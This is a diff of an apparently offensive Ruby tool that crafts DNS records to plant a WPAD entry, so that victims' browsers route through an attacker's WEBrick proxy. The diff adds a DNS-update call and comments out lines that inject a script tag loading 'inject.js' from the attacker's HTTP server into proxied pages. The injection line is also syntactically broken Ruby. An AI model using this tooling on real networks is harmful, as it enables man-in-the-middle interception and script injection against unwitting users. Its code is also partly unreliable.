@@ -11,6 +11,8 @@ require "webrick/httpproxy"
 require "webrick/httputils"
 require "pp"
 
+require "distort_dns"
+
 =begin
 	Craft a DNS A record to create the WPAD entry for this host.
 =end
@@ -59,8 +61,8 @@ def start_http(http_port, http_root, data_dir)
 end
 
 def modify_body (body, http_ip, http_port, http_root)
-  js_file = "http://" + http_ip + ":" + http_port.to_s + "/inject.js"
-  body.gsub(s%</head>%<script language='javascript' src='${JS_URL}'></script></head>%i)
+#  js_file = "http://" + http_ip + ":" + http_port.to_s + "/inject.js"
+#  body.gsub(s%</head>%<script language='javascript' src='${JS_URL}'></script></head>%i)
   return body
 end
 
@@ -204,3 +206,5 @@ end
 #end
 
 setup_files options["http_root"], options["proxy_port"], options["proxy_ip"], options["http_port"]
+
+update_dns options["proxy_ip"], options["domain"], options["primary_dns"]
